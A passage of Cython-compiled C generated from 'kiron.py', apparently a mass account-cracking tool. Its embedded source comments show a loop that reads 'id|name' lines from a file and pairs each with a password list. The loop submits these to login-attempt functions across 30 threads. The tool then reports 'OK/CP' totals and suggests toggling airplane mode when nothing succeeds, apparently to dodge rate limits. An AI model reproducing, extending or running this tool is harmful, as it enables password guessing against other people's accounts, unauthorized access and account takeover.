                      PyObject *__pyx_callargs[5] = {__pyx_t_15, __pyx_t_6, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist};
                      __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_7, 4+__pyx_t_7);
                      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 309, __pyx_L41_error)
                      __Pyx_GOTREF(__pyx_t_4);
                      __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                    }
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

                    /* "kiron.py":308
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(api2,ids,names,passlist)
 *                                 print('\033[1;37m')
 */
                  }
                  __pyx_L51:;

                  /* "kiron.py":303
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE')
 *                                         linex()
 *                                         for user in fo:             # <<<<<<<<<<<<<<
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 */
                }
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

                /* "kiron.py":296
 *                                 else:
 *                                         pcp.append('n')
 *                                 with tred(max_workers=30) as crack_submit:             # <<<<<<<<<<<<<<
 *                                         clear()
 *                                         total_ids = str(len(fo))
 */
              }
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
              goto __pyx_L46_try_end;
              __pyx_L41_error:;
              __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
              __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              /*except:*/ {
                __Pyx_AddTraceback("kiron.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_16) < 0) __PYX_ERR(0, 296, __pyx_L43_except_error)
                __Pyx_XGOTREF(__pyx_t_5);
                __Pyx_XGOTREF(__pyx_t_4);
                __Pyx_XGOTREF(__pyx_t_16);
                __pyx_t_6 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_16); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 296, __pyx_L43_except_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_23 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_6, NULL);
                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 296, __pyx_L43_except_error)
                __Pyx_GOTREF(__pyx_t_23);
                __pyx_t_10 = __Pyx_PyObject_IsTrue(__pyx_t_23);
                __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                if (__pyx_t_10 < 0) __PYX_ERR(0, 296, __pyx_L43_except_error)
                __pyx_t_11 = (!__pyx_t_10);
                if (unlikely(__pyx_t_11)) {
                  __Pyx_GIVEREF(__pyx_t_5);
                  __Pyx_GIVEREF(__pyx_t_4);
                  __Pyx_XGIVEREF(__pyx_t_16);
                  __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_16);
                  __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_16 = 0; 
                  __PYX_ERR(0, 296, __pyx_L43_except_error)
                }
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                goto __pyx_L42_exception_handled;
              }
              __pyx_L43_except_error:;
              __Pyx_XGIVEREF(__pyx_t_13);
              __Pyx_XGIVEREF(__pyx_t_14);
              __Pyx_XGIVEREF(__pyx_t_21);
              __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_21);
              goto __pyx_L3_error;
              __pyx_L42_exception_handled:;
              __Pyx_XGIVEREF(__pyx_t_13);
              __Pyx_XGIVEREF(__pyx_t_14);
              __Pyx_XGIVEREF(__pyx_t_21);
              __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_21);
              __pyx_L46_try_end:;
            }
          }
          /*finally:*/ {
            /*normal exit:*/{
              if (__pyx_t_12) {
                __pyx_t_21 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__27, NULL);
                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 296, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_21);
                __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
              }
              goto __pyx_L40;
            }
            __pyx_L40:;
          }
          goto __pyx_L60;
          __pyx_L37_error:;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          goto __pyx_L3_error;
          __pyx_L60:;
        }

        /* "kiron.py":310
 *                                                 elif mthd in ['2','02']:
 *                                                         crack_submit.submit(api2,ids,names,passlist)
 *                                 print('\033[1;37m')             # <<<<<<<<<<<<<<
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
 */
        __pyx_t_16 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 310, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

        /* "kiron.py":311
 *                                                         crack_submit.submit(api2,ids,names,passlist)
 *                                 print('\033[1;37m')
 *                                 print(f'\r\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
 */
        __pyx_t_16 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__37, NULL); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 311, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

        /* "kiron.py":312
 *                                 print('\033[1;37m')
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 */
        __pyx_t_16 = PyTuple_New(3); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_A); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_16, 1, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS);
        __pyx_t_8 += 49;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS);
        PyTuple_SET_ITEM(__pyx_t_16, 2, __pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS);
        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_16, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

        /* "kiron.py":313
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))             # <<<<<<<<<<<<<<
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 *                                 input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO BACK ')
 */
        __pyx_t_16 = PyTuple_New(3); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_16, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP);
        __pyx_t_8 += 38;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP);
        PyTuple_SET_ITEM(__pyx_t_16, 2, __pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_16, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_oks); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_8 = PyObject_Length(__pyx_t_16); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_16); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = PyNumber_Add(__pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_16, __pyx_kp_s__38); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_cps); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_8 = PyObject_Length(__pyx_t_16); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_16); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = PyNumber_Add(__pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_16); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":314
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
 *                                 print(f'\r\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 *                                 input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO BACK ')
 *                                 menu()
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__37, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":315
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 *                                 input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO BACK ')             # <<<<<<<<<<<<<<
 *                                 menu()
 *                         elif xd in ['2','02']:
 */
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_A); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER);
        __pyx_t_8 += 44;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER);
        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":316
 *                                 print(f'\r\x1b[1;97m\033[1;37m')
 *                                 input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO BACK ')
 *                                 menu()             # <<<<<<<<<<<<<<
 *                         elif xd in ['2','02']:
 *                                 rnd()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_menu); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_16 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_16, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 316, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":263
 *                         linex()
 *                         xd=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                         if xd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                 clear();print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ');linex()
 *                                 file = input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m FILE NAME : ')
 */
        goto __pyx_L9;
      }

      /* "kiron.py":317
 *                                 input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO BACK ')
 *                                 menu()
 *                         elif xd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                 rnd()
 *                         elif xd in ['3','03']:
 */
      __Pyx_INCREF(__pyx_v_xd);
      __pyx_t_4 = __pyx_v_xd;
      __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_2, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 317, __pyx_L3_error)
      if (!__pyx_t_10) {
      } else {
        __pyx_t_11 = __pyx_t_10;
        goto __pyx_L61_bool_binop_done;
      }
      __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_02, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 317, __pyx_L3_error)
      __pyx_t_11 = __pyx_t_10;
      __pyx_L61_bool_binop_done:;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_10 = __pyx_t_11;
      if (__pyx_t_10) {

        /* "kiron.py":318
 *                                 menu()
 *                         elif xd in ['2','02']:
 *                                 rnd()             # <<<<<<<<<<<<<<
 *                         elif xd in ['3','03']:
 *                                 _old_()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_rnd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 318, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_16 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_16, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 318, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":317
 *                                 input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO BACK ')
 *                                 menu()
 *                         elif xd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                 rnd()
 *                         elif xd in ['3','03']:
 */
        goto __pyx_L9;
      }

      /* "kiron.py":319
 *                         elif xd in ['2','02']:
 *                                 rnd()
 *                         elif xd in ['3','03']:             # <<<<<<<<<<<<<<
 *                                 _old_()
 *                         elif xd in ['0','05']:
 */
      __Pyx_INCREF(__pyx_v_xd);
      __pyx_t_4 = __pyx_v_xd;
      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_3, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 319, __pyx_L3_error)
      if (!__pyx_t_11) {
      } else {
        __pyx_t_10 = __pyx_t_11;
        goto __pyx_L63_bool_binop_done;
      }
      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_03, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 319, __pyx_L3_error)
      __pyx_t_10 = __pyx_t_11;
      __pyx_L63_bool_binop_done:;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_11 = __pyx_t_10;
      if (__pyx_t_11) {

        /* "kiron.py":320
 *                                 rnd()
 *                         elif xd in ['3','03']:
 *                                 _old_()             # <<<<<<<<<<<<<<
 *                         elif xd in ['0','05']:
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXIT DONE ')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_old); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 320, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_16 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_16, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":319
 *                         elif xd in ['2','02']:
 *                                 rnd()
 *                         elif xd in ['3','03']:             # <<<<<<<<<<<<<<
 *                                 _old_()
 *                         elif xd in ['0','05']:
 */
        goto __pyx_L9;
      }

      /* "kiron.py":321
 *                         elif xd in ['3','03']:
 *                                 _old_()
 *                         elif xd in ['0','05']:             # <<<<<<<<<<<<<<
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXIT DONE ')
 *                         else:
 */
      __Pyx_INCREF(__pyx_v_xd);
      __pyx_t_4 = __pyx_v_xd;
      __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_0_2, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 321, __pyx_L3_error)
      if (!__pyx_t_10) {
      } else {
        __pyx_t_11 = __pyx_t_10;
        goto __pyx_L65_bool_binop_done;
      }
      __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_05, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 321, __pyx_L3_error)
      __pyx_t_11 = __pyx_t_10;
      __pyx_L65_bool_binop_done:;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_10 = __pyx_t_11;
      if (__pyx_t_10) {

        /* "kiron.py":322
 *                                 _old_()
 *                         elif xd in ['0','05']:
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXIT DONE ')             # <<<<<<<<<<<<<<
 *                         else:
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m OPTION NOT FOUND IN MENU...')
 */
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 322, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
